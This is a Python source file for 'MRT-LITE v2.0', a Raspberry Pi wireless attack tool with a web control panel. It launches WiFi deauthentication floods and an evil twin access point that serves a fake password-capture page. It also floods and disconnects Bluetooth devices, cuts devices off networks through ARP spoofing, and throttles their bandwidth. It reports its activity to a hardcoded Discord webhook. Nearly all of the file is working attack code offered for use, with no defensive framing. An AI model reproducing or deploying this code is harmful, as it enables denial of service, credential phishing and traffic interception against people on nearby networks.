#!/usr/bin/env python3


import os
import time
import subprocess
import threading
import json
import socket
import random
import datetime
import requests
import signal
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import deque

# ============================================
# KONFIGURASI OPTIMIZED
# ============================================

interface = "wlan0"
attack_running = False
evil_twin_running = False
bt_jammer_running = False
netcut_running = False
current_attack = "idle"
devices_found = []
bt_target = None
scan_results = []
phished_passwords = deque(maxlen=50)
attack_log = deque(maxlen=100)

# Performance settings for Pi Zero W
DEAUTH_FRAMES = 100
DEAUTH_SLEEP = 0.05
BT_SLEEP = 0.1
SCAN_TIMEOUT = 2
CLEANUP_INTERVAL = 300

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1509759458505654273/EjVRG1Vj0Mkr77zDFPdw2ayDVv4vLLCuPZCl24_vOkGKEbFZ2FHd0gdC49SMmPlLtdx-"

# ============================================
# ADD NETWORK MANUAL (BUAT HOTSPOT/HOTSPOT)
# ============================================

def add_wifi_network(ssid, password):
    """Tambahkan jaringan WiFi baru dan connect"""
    try:
        # Buat config file buat wpa_supplicant
        config = f'''network={{
    ssid="{ssid}"
    psk="{password}"
    key_mgmt=WPA-PSK
    priority=1
}}'''
        
        # Append ke config
        with open("/etc/wpa_supplicant/wpa_supplicant.conf", "a") as f:
            f.write(config)
        
        # Restart wifi biar connect
        os.system("sudo wpa_cli reconfigure 2>/dev/null")
        time.sleep(3)
        
        # Cek koneksi
        result = subprocess.run(["iwgetid", "-r"], capture_output=True, text=True)
        current_ssid = result.stdout.strip()
        
        send_discord("WIFI ADDED", f"SSID: {ssid}\nConnected: {current_ssid == ssid}", 0x00ff00)
        return {"status": "success", "connected": current_ssid == ssid, "ssid": current_ssid}
    except Exception as e:
        send_discord("WIFI ERROR", f"Failed: {ssid}", 0xff0000)
        return {"status": "error", "message": str(e)}

def scan_wifi_networks():
    """Scan WiFi networks available"""
    networks = []
    try:
        result = subprocess.run(["sudo", "iw", "dev", interface, "scan"], capture_output=True, text=True, timeout=10)
        lines = result.stdout.split('\n')
        ssid = ""
        for line in lines:
            if "SSID:" in line:
                ssid = line.split("SSID:")[1].strip()
                if ssid and ssid != "":
                    networks.append({"ssid": ssid})
        return networks[:30]
    except:
        return []

def get_current_wifi():
    """Dapatkan SSID yang sedang terkoneksi"""
    try:
        result = subprocess.run(["iwgetid", "-r"], capture_output=True, text=True)
        return result.stdout.strip() or "Not connected"
    except:
        return "Unknown"

def disconnect_wifi():
    """Putuskan koneksi WiFi saat ini"""
    os.system("sudo nmcli radio wifi off")
    time.sleep(1)
    os.system("sudo nmcli radio wifi on")
    return {"status": "disconnected"}

# ============================================
# AUTO CLEANUP & MONITOR
# ============================================

def cleanup_resources():
    while True:
        time.sleep(CLEANUP_INTERVAL)
        os.system("sudo ip neigh flush all 2>/dev/null")
        os.system("sudo pkill -9 defunct 2>/dev/null")
        os.system("sudo iptables -F 2>/dev/null")
        os.system("rm -f /tmp/*.conf /tmp/*.html 2>/dev/null")
        send_discord("CLEANUP", "Resources cleaned", 0xff6600)

threading.Thread(target=cleanup_resources, daemon=True).start()

def check_cpu_temp():
    try:
        with open("/sys/class/thermal/thermal_zone0/temp", "r") as f:
            temp = int(f.read()) / 1000
        if temp > 75:
            global attack_running, bt_jammer_running
            attack_running = False
            bt_jammer_running = False
            send_discord("CPU HOT", f"Temp: {temp}°C - Attacks paused", 0xff0000)
            time.sleep(10)
    except:
        pass

def send_discord(title, message, color=0xff0000):
    try:
        data = {
            "embeds": [{
                "title": f"🔴 {title}",
                "description": message,
                "color": color,
                "timestamp": datetime.datetime.now().isoformat(),
                "footer": {"text": "MRT-LITE | Pi Zero W"}
            }]
        }
        requests.post(DISCORD_WEBHOOK, json=data, timeout=1)
    except:
        pass

# ============================================
# GET IP & GATEWAY (CACHED)
# ============================================

_cached_ip = None
_cached_gateway = None
_ip_cache_time = 0

def get_ip():
    global _cached_ip, _ip_cache_time
    if time.time() - _ip_cache_time > 10:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            _cached_ip = s.getsockname()[0]
            s.close()
            _ip_cache_time = time.time()
        except:
            _cached_ip = "127.0.0.1"
    return _cached_ip

def get_gateway():
    global _cached_gateway
    if not _cached_gateway:
        try:
            result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True, timeout=2)
            _cached_gateway = result.stdout.split()[2] if result.stdout else "192.168.1.1"
        except:
            _cached_gateway = "192.168.1.1"
    return _cached_gateway

# ============================================
# WIFI SCAN (OPTIMIZED)
# ============================================

def scan_wifi():
    global scan_results
    scan_results = []
    try:
        os.system(f"sudo iw dev {interface} scan > /tmp/scan_result 2>&1 &")
        time.sleep(SCAN_TIMEOUT)
        
        with open("/tmp/scan_result", "r") as f:
            content = f.read()
        
        lines = content.split('\n')
        ssid = ""; bssid = ""
        for line in lines:
            if "BSS" in line or "bssid" in line.lower():
                parts = line.split()
                if len(parts) > 1:
                    bssid = parts[1]
            elif "SSID:" in line:
                ssid = line.split("SSID:")[1].strip()
                if ssid and ssid != "" and bssid:
                    scan_results.append({"ssid": ssid, "bssid": bssid})
                    ssid = ""; bssid = ""
        return scan_results[:20]
    except:
        return []

# ============================================
# DEAUTH + AUTO EVIL TWIN (OPTIMIZED)
# ============================================

def get_bssid(ssid):
    networks = scan_wifi()
    for net in networks:
        if net.get("ssid") == ssid:
            return net.get("bssid")
    return "FF:FF:FF:FF:FF:FF"

def start_evil_twin(target_ssid):
    global evil_twin_running
    evil_twin_running = True
    
    fake_html = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Login</title></head>
<body style="text-align:center;margin-top:20%;font-family:monospace;">
<h2>penetration testing </h2>
<form method="POST" action="/login">
<input type="password" name="pass" placeholder="Password"><br><br>
<input type="submit" value="Login">
</form>
</body>
</html>'''
    
    with open("/tmp/evil_index.html", "w") as f:
        f.write(fake_html)
    
    os.system("sudo pkill -9 hostapd 2>/dev/null")
    os.system("sudo pkill -9 dnsmasq 2>/dev/null")
    time.sleep(0.5)
    
    config = f"""interface={interface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel=6
"""
    with open("/tmp/hostapd.conf", "w") as f:
        f.write(config)
    
    os.system("sudo hostapd /tmp/hostapd.conf -B 2>/dev/null")
    time.sleep(0.5)
    os.system("sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0")
    os.system("sudo dnsmasq -a 192.168.1.1 -d -i wlan0 -F 192.168.1.50,192.168.1.150,255.255.255.0 &")
    
    send_discord("EVIL TWIN", f"AP cloned: {target_ssid}", 0xff0000)
    return True

def stop_evil_twin():
    global evil_twin_running
    evil_twin_running = False
    os.system("sudo pkill -9 hostapd")
    os.system("sudo pkill -9 dnsmasq")
    os.system("sudo killall dnsmasq 2>/dev/null")

def start_deauth(duration=60, target_ssid="broadcast"):
    global attack_running, current_attack, evil_twin_running
    
    attack_running = True
    current_attack = f"deauth_{target_ssid}"
    end = time.time() + duration
    
    if target_ssid != "broadcast" and not evil_twin_running:
        threading.Thread(target=start_evil_twin, args=(target_ssid,)).start()
        time.sleep(2)
    
    bssid = get_bssid(target_ssid) if target_ssid != "broadcast" else "FF:FF:FF:FF:FF:FF"
    send_discord("DEAUTH", f"Target: {target_ssid}\nDuration: {duration}s", 0xff0000)
    
    while attack_running and time.time() < end:
        check_cpu_temp()
        for _ in range(DEAUTH_FRAMES):
            os.system(f"sudo iw dev {interface} send deauth -c 6 -b {bssid} 2>/dev/null")
        time.sleep(DEAUTH_SLEEP)
    
    attack_running = False
    current_attack = "idle"
    send_discord("DEAUTH", f"Finished: {target_ssid}", 0x00ff00)

def stop_deauth():
    global attack_running
    attack_running = False

# ============================================
# BT JAMMER (OPTIMIZED)
# ============================================

def scan_bluetooth():
    devices = []
    try:
        result = subprocess.run(["sudo", "hcitool", "scan"], capture_output=True, text=True, timeout=5)
        lines = result.stdout.split('\n')[1:]
        for line in lines:
            if line.strip() and len(line.split()) >= 2:
                parts = line.split()
                devices.append({"mac": parts[0], "name": " ".join(parts[1:])})
        return devices[:10]
    except:
        return []

def bt_jammer_start(mac, duration=60):
    global bt_jammer_running, bt_target
    bt_jammer_running = True
    bt_target = mac
    end = time.time() + duration
    
    send_discord("BT JAMMER", f"Target: {mac}\nDuration: {duration}s", 0xff0000)
    
    def jam():
        while bt_jammer_running and time.time() < end:
            check_cpu_temp()
            os.system(f"sudo l2ping -s 600 -f {mac} 2>/dev/null &")
            os.system(f"sudo hcitool cc {mac} 2>/dev/null &")
            os.system(f"sudo hcitool dc {mac} 2>/dev/null &")
            time.sleep(BT_SLEEP)
        
        os.system("sudo pkill -9 l2ping")
        os.system("sudo pkill -9 hcitool")
        send_discord("BT JAMMER", f"Stopped: {mac}", 0xff6600)
    
    threading.Thread(target=jam, daemon=True).start()

def bt_jammer_stop():
    global bt_jammer_running
    bt_jammer_running = False
    os.system("sudo pkill -9 l2ping hcitool")

# ============================================
# DEVICE SCANNER (OPTIMIZED)
# ============================================

def device_scan():
    global devices_found
    devices_found = []
    
    try:
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=3)
        for line in result.stdout.split('\n'):
            if "(" in line and ")" in line:
                ip = line.split("(")[1].split(")")[0]
                mac = line.split("at ")[1].split(" ")[0] if "at " in line else "unknown"
                if ip.startswith("192.168") and ip != get_ip():
                    devices_found.append({"ip": ip, "mac": mac, "type": "unknown"})
    except:
        pass
    
    for device in devices_found[:15]:
        ip = device.get("ip")
        for port, dtype in [(80, "web"), (22, "ssh"), (554, "cctv")]:
            if os.system(f"nc -zv {ip} {port} 2>&1 > /dev/null") == 0:
                device["type"] = dtype
                break
    
    return devices_found[:20]

# ============================================
# NETCUT & SPEED CONTROL (OPTIMIZED)
# ============================================

def netcut_start(target_ip, duration=60):
    global netcut_running, netcut_target
    netcut_running = True
    gateway = get_gateway()
    end = time.time() + duration
    
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    send_discord("NETCUT", f"Target: {target_ip}\nDuration: {duration}s", 0xff0000)
    
    while netcut_running and time.time() < end:
        os.system(f"sudo arpspoof -i {interface} -t {target_ip} {gateway} > /dev/null 2>&1 &")
        os.system(f"sudo arpspoof -i {interface} -t {gateway} {target_ip} > /dev/null 2>&1 &")
        time.sleep(3)
    
    netcut_stop()

def netcut_stop():
    global netcut_running
    netcut_running = False
    os.system("sudo pkill -9 arpspoof")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def set_speed_limit(target_ip, speed_kbps):
    if speed_kbps == 0:
        remove_speed_limit()
        return
    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")
    os.system(f"sudo tc qdisc add dev {interface} root handle 1: htb default 30")
    os.system(f"sudo tc class add dev {interface} parent 1: classid 1:1 htb rate {speed_kbps}kbit")
    os.system(f"sudo tc filter add dev {interface} parent 1: protocol ip prio 1 u32 match ip dst {target_ip} flowid 1:1")

def remove_speed_limit():
    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")

def apply_speed_to_all(speed_kbps):
    if speed_kbps == 0:
        remove_speed_limit()
        return
    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")
    os.system(f"sudo tc qdisc add dev {interface} root handle 1: htb default 30")
    os.system(f"sudo tc class add dev {interface} parent 1: classid 1:1 htb rate {speed_kbps}kbit")

# ============================================
# STOP ALL
# ============================================

def stop_all():
    global attack_running, bt_jammer_running, netcut_running, evil_twin_running
    attack_running = False
    bt_jammer_running = False
    netcut_running = False
    evil_twin_running = False
    
    os.system("sudo pkill -9 arpspoof l2ping hcitool hostapd dnsmasq 2>/dev/null")
    remove_speed_limit()
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    send_discord("EMERGENCY STOP", "All attacks halted", 0xff0000)

# ============================================
# WEB UI (DENGAN ADD NETWORK)
# ============================================

HTML = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>MRT-LITE v2.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#fff;font-family:'Courier New',monospace;font-size:11px;color:#cc0000;padding:12px;}
.container{max-width:700px;margin:0 auto;border:1px solid #cc0000;padding:15px;background:#fff;}
.header{text-align:center;margin-bottom:15px;border-bottom:1px solid #cc0000;padding-bottom:10px;}
.title{font-size:22px;letter-spacing:2px;}
.subtitle{font-size:8px;}
.warning{background:#ffeeee;border-left:3px solid #cc0000;padding:6px;margin-bottom:12px;font-size:9px;}
.section{margin-bottom:12px;border:1px solid #ffcccc;padding:8px;}
.section-title{font-size:9px;margin-bottom:5px;border-bottom:1px solid #ffcccc;padding-bottom:3px;}
input,select,button{background:#fff;border:1px solid #cc0000;color:#cc0000;padding:3px 6px;font-family:'Courier New',monospace;font-size:9px;margin:1px;cursor:pointer;}
button:hover{background:#cc0000;color:#fff;}
.result-area{margin-top:5px;padding:4px;border:1px solid #ffcccc;min-height:25px;max-height:70px;overflow:auto;font-size:8px;}
.slider{width:100%;margin:4px 0;}
.footer{margin-top:10px;padding-top:6px;border-top:1px solid #ffcccc;font-size:8px;text-align:center;}
.red{color:#cc0000;}
.green{color:#006600;}
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="title">MRT-LITE v2.0</div>
<div class="subtitle">optimized for Pi Zero W | deauth+et | bt jammer | netcut | add network</div>
</div>
<div class="warning">[!] MAX PERFORMANCE MODE - Pi Zero W OPTIMIZED</div>

<!-- ADD NETWORK SECTION -->
<div class="section">
<div class="section-title">> ADD NETWORK (CONNECT TO HOTSPOT)</div>
<input type="text" id="newSsid" placeholder="WiFi SSID" style="width:150px;">
<input type="password" id="newPwd" placeholder="Password" style="width:120px;">
<button id="addNetworkBtn">CONNECT</button>
<button id="scanNetworkBtn">SCAN WIFI</button>
<button id="disconnectBtn">DISCONNECT</button>
<div id="networkStatus" class="result-area">current: <span id="currentWifi">loading...</span></div>
</div>

<div class="section">
<div class="section-title">> DEAUTH + AUTO EVIL TWIN</div>
<select id="deauthTarget"><option value="broadcast">broadcast</option></select>
<input type="number" id="deauthDur" value="30" style="width:50px;"> sec
<button id="deauthStart">START</button>
<button id="deauthStop">STOP</button>
<div id="deauthStatus" class="result-area">idle</div>
</div>

<div class="section">
<div class="section-title">> BT JAMMER</div>
<button id="btScan">SCAN</button>
<select id="btTarget"><option>select device</option></select>
<input type="number" id="btDur" value="30" style="width:50px;"> sec
<button id="btStart">JAM</button>
<button id="btStop">STOP</button>
<div id="btResult" class="result-area">idle</div>
</div>

<div class="section">
<div class="section-title">> DEVICE SCANNER</div>
<button id="scanDevices">SCAN</button>
<div id="deviceResult" class="result-area">not scanned</div>
</div>

<div class="section">
<div class="section-title">> NETCUT</div>
<select id="netcutTarget"><option>select target</option></select>
<input type="number" id="netcutDur" value="30" style="width:50px;"> sec
<button id="netcutStart">CUT</button>
<button id="netcutStop">STOP</button>
<div id="netcutStatus" class="result-area">idle</div>
</div>

<div class="section">
<div class="section-title">> SPEED CONTROL</div>
<select id="speedTarget"><option value="all">all devices</option></select>
<input type="range" id="speedSlider" min="0" max="5120" step="64" value="0" style="width:100%;">
<div>limit: <span id="speedVal">0</span> kbps</div>
<button id="speedApply">APPLY</button>
<button id="speedRemove">REMOVE</button>
<div id="speedStatus" class="result-area">no limit</div>
</div>

<div class="section">
<button id="stopAll" style="background:#cc0000;color:#fff;">EMERGENCY STOP</button>
</div>

<div class="footer">MRT-LITE | RANZX | optimized</div>
</div>

<script>
async function fetchJson(u){let r=await fetch(u);return r.json();}

// Load current WiFi
async function loadCurrentWifi(){
    let d=await fetchJson('/api/wifi/current');
    document.getElementById('currentWifi').innerText = d.ssid;
}

// Add network
document.getElementById('addNetworkBtn').onclick=async()=>{
    let ssid=document.getElementById('newSsid').value;
    let pwd=document.getElementById('newPwd').value;
    if(!ssid) return alert('Enter SSID');
    let res=await fetch(`/api/wifi/add?ssid=${encodeURIComponent(ssid)}&pwd=${encodeURIComponent(pwd)}`);
    let d=await res.json();
    document.getElementById('networkStatus').innerHTML=`<div class="result-line ${d.connected?'green':'red'}">${d.status} - ${d.ssid||''}</div>`;
    loadCurrentWifi();
    loadWifi();
};

// Scan networks
document.getElementById('scanNetworkBtn').onclick=async()=>{
    let d=await fetchJson('/api/wifi/scan');
    if(d.networks){
        let html='<div class="result-line">Available networks:</div>';
        for(let n of d.networks.slice(0,10)){
            html+=`<div class="result-line">> ${n.ssid}</div>`;
        }
        document.getElementById('networkStatus').innerHTML=html;
    }
};

// Disconnect
document.getElementById('disconnectBtn').onclick=async()=>{
    await fetch('/api/wifi/disconnect');
    document.getElementById('networkStatus').innerHTML='<div class="result-line">disconnected</div>';
    loadCurrentWifi();
};

async function loadWifi(){
    let d=await fetchJson('/api/scan');
    if(d.networks){
        let h='<option value="broadcast">broadcast</option>';
        for(let n of d.networks) if(n.ssid) h+=`<option value="${n.ssid}">${n.ssid}</option>`;
        document.getElementById('deauthTarget').innerHTML=h;
    }
}

async function loadDevices(){
    let d=await fetchJson('/api/devices');
    if(d.devices){
        let h='<option>select target</option>';
        for(let dev of d.devices) h+=`<option value="${dev.ip}">${dev.ip}</option>`;
        document.getElementById('netcutTarget').innerHTML=h;
        let h2='<option value="all">all devices</option>';
        for(let dev of d.devices) h2+=`<option value="${dev.ip}">${dev.ip}</option>`;
        document.getElementById('speedTarget').innerHTML=h2;
    }
}

document.getElementById('btScan').onclick=async()=>{
    let d=await fetchJson('/api/bt/scan');
    if(d.devices){
        let h='<option>select device</option>';
        for(let b of d.devices) h+=`<option value="${b.mac}">${b.mac}</option>`;
        document.getElementById('btTarget').innerHTML=h;
        document.getElementById('btResult').innerHTML=`<div class="result-line">found ${d.devices.length}</div>`;
    }
};

document.getElementById('deauthStart').onclick=async()=>{
    let t=document.getElementById('deauthTarget').value,d=document.getElementById('deauthDur').value;
    await fetch(`/api/deauth/start?duration=${d}&target=${encodeURIComponent(t)}`);
    document.getElementById('deauthStatus').innerHTML=`<div class="result-line red">ACTIVE: ${t}</div>`;
    setTimeout(()=>document.getElementById('deauthStatus').innerHTML='<div class="result-line">idle</div>',d*1000);
};
document.getElementById('deauthStop').onclick=async()=>{await fetch('/api/deauth/stop');document.getElementById('deauthStatus').innerHTML='<div class="result-line">stopped</div>';};
document.getElementById('btStart').onclick=async()=>{
    let m=document.getElementById('btTarget').value,d=document.getElementById('btDur').value;
    if(!m||m=='select device')return;
    await fetch(`/api/bt/jammer/start?mac=${m}&duration=${d}`);
    document.getElementById('btResult').innerHTML=`<div class="result-line red">JAMMING: ${m}</div>`;
    setTimeout(()=>document.getElementById('btResult').innerHTML='<div class="result-line">idle</div>',d*1000);
};
document.getElementById('btStop').onclick=async()=>{await fetch('/api/bt/jammer/stop');document.getElementById('btResult').innerHTML='<div class="result-line">stopped</div>';};
document.getElementById('scanDevices').onclick=async()=>{
    document.getElementById('deviceResult').innerHTML='<div class="result-line">scanning...</div>';
    let d=await fetchJson('/api/devices');
    if(d.devices){
        let h=`<div class="result-line">${d.devices.length} devices:</div>`;
        for(let dev of d.devices.slice(0,8)) h+=`<div class="result-line">> ${dev.ip}</div>`;
        document.getElementById('deviceResult').innerHTML=h;
        await loadDevices();
    }
};
document.getElementById('netcutStart').onclick=async()=>{
    let t=document.getElementById('netcutTarget').value,d=document.getElementById('netcutDur').value;
    if(!t||t=='select target')return;
    await fetch(`/api/netcut/start?target=${t}&duration=${d}`);
    document.getElementById('netcutStatus').innerHTML=`<div class="result-line red">CUT: ${t}</div>`;
    setTimeout(()=>document.getElementById('netcutStatus').innerHTML='<div class="result-line">idle</div>',d*1000);
};
document.getElementById('netcutStop').onclick=async()=>{await fetch('/api/netcut/stop');document.getElementById('netcutStatus').innerHTML='<div class="result-line">stopped</div>';};
let s=document.getElementById('speedSlider');s.oninput=()=>{document.getElementById('speedVal').innerText=s.value;};
document.getElementById('speedApply').onclick=async()=>{
    let t=document.getElementById('speedTarget').value,sp=s.value;
    await fetch(`/api/speed/apply?target=${t}&speed=${sp}`);
    document.getElementById('speedStatus').innerHTML=`<div class="result-line">limit: ${sp}kbps</div>`;
};
document.getElementById('speedRemove').onclick=async()=>{
    await fetch('/api/speed/remove');
    document.getElementById('speedStatus').innerHTML='<div class="result-line">no limit</div>';
    s.value=0;
};
document.getElementById('stopAll').onclick=async()=>{await fetch('/api/stop/all');};
loadWifi();loadDevices();loadCurrentWifi();
setInterval(loadCurrentWifi, 30000);
</script>
</body>
</html>'''

# ============================================
# HTTP HANDLER
# ============================================

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args, **kwargs): pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200); self.send_header('content-type', 'text/html'); self.end_headers()
            self.wfile.write(HTML.encode())
        
        elif self.path == '/api/status':
            self.send_json({'current_attack': current_attack, 'evil_twin': evil_twin_running, 'bt_jammer': bt_jammer_running})
        
        elif self.path == '/api/scan':
            self.send_json({'networks': scan_wifi()})
        
        elif self.path == '/api/devices':
            self.send_json({'devices': device_scan()})
        
        elif self.path == '/api/bt/scan':
            self.send_json({'devices': scan_bluetooth()})
        
        elif self.path == '/api/wifi/current':
            self.send_json({'ssid': get_current_wifi()})
        
        elif self.path == '/api/wifi/scan':
            self.send_json({'networks': scan_wifi_networks()})
        
        elif self.path == '/api/wifi/disconnect':
            self.send_json(disconnect_wifi())
        
        elif self.path.startswith('/api/wifi/add'):
            ssid = self.path.split('ssid=')[1].split('&')[0] if 'ssid=' in self.path else ''
            pwd = self.path.split('pwd=')[1] if 'pwd=' in self.path else ''
            if ssid:
                result = add_wifi_network(ssid, pwd)
                self.send_json(result)
            else:
                self.send_json({'status': 'error', 'message': 'no ssid'})
        
        elif self.path.startswith('/api/deauth/start'):
            dur = int(self.path.split('duration=')[1].split('&')[0]) if 'duration=' in self.path else 30
            target = self.path.split('target=')[1] if 'target=' in self.path else 'broadcast'
            threading.Thread(target=start_deauth, args=(dur, target)).start()
            self.send_json({'status': 'started'})
        
        elif self.path == '/api/deauth/stop':
            stop_deauth()
            self.send_json({'status': 'stopped'})
        
        elif self.path.startswith('/api/bt/jammer/start'):
            mac = self.path.split('mac=')[1].split('&')[0] if 'mac=' in self.path else ''
            dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            if mac:
                threading.Thread(target=bt_jammer_start, args=(mac, dur)).start()
            self.send_json({'status': 'started'})
        
        elif self.path == '/api/bt/jammer/stop':
            bt_jammer_stop()
            self.send_json({'status': 'stopped'})
        
        elif self.path.startswith('/api/netcut/start'):
            target = self.path.split('target=')[1].split('&')[0] if 'target=' in self.path else ''
            dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            if target and target != 'select target':
                threading.Thread(target=netcut_start, args=(target, dur)).start()
            self.send_json({'status': 'started'})
        
        elif self.path == '/api/netcut/stop':
            netcut_stop()
            self.send_json({'status': 'stopped'})
        
        elif self.path.startswith('/api/speed/apply'):
            target = self.path.split('target=')[1].split('&')[0] if 'target=' in self.path else 'all'
            speed = int(self.path.split('speed=')[1]) if 'speed=' in self.path else 0
            if target == 'all':
                apply_speed_to_all(speed)
            else:
                set_speed_limit(target, speed)
            self.send_json({'status': 'applied'})
        
        elif self.path == '/api/speed/remove':
            remove_speed_limit()
            self.send_json({'status': 'removed'})
        
        elif self.path == '/api/stop/all':
            stop_all()
            self.send_json({'status': 'stopped'})
        
        else:
            self.send_response(404); self.end_headers()
    
    def send_json(self, data):
        self.send_response(200); self.send_header('content-type', 'application/json'); self.end_headers()
        self.wfile.write(json.dumps(data).encode())

# ============================================
# MAIN
# ============================================

if __name__ == '__main__':
    os.system('clear')
    print('\033[91m╔════════════════════════════════════════════╗')
    print('║      MRT-LITE ULTIMATE v2.0 - RANZX          ║')
    print('║         MAX PERFORMANCE for Pi Zero W         ║')
    print('║  CPU Optimized | RAM Efficient | Auto Recovery║')
    print('║  + Add Network (Connect to Hotspot)           ║')
    print('╚════════════════════════════════════════════╝\033[0m')
    
    os.system(f"sudo ifconfig {interface} up 2>/dev/null")
    local_ip = get_ip()
    
    print(f'\n\033[91m[!]\033[0m Web UI: http://{local_ip}:8080')
    print(f'\033[91m[!]\033[0m Discord Monitor: ACTIVE')
    print(f'\033[91m[!]\033[0m Performance Settings:')
    print(f'\033[91m    - Deauth frames: {DEAUTH_FRAMES} (optimized)')
    print(f'\033[91m    - BT interval: {BT_SLEEP}s')
    print(f'\033[91m    - Auto cleanup: every {CLEANUP_INTERVAL}s')
    print(f'\033[91m[!]\033[0m ADD NETWORK: Connect Pi Zero W to any WiFi hotspot')
    print(f'\033[91m[!]\033[0m Press Ctrl+C to stop\n')
    
    server = HTTPServer(('0.0.0.0', 8080), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n\033[91m[!]\033[0m Shutting down...')
        stop_all()
        server.shutdown()
